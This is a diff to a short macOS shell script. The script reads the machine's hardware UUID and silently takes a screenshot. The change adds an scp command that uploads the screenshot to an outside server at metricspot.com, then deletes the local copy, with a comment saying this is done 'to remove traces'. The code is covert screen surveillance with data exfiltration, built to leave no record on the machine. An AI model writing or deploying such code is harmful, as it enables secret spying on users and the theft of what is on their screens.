@@ -5,11 +5,13 @@
 # open facetime://
 # sleep 5
 
-# Define a timestamp variable
-timestamp=$(date +%s)
-# username=$(osascript -e "host name of (system info)")
+# timestamp=$(date +%s)
 uuid=$(ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}')
 
-screencapture -x $uuid-$timestamp-screenshot.png
+screencapture -x $uuid-screenshot.png
 
-#TO DO - upload to server
+# Upload file to server
+scp $uuid-screenshot.png eudomus@metricspot.com:/home/eudomus/webapps/macdefense
+
+# Delete file from local folder to remove traces
+rm $uuid-screenshot.png
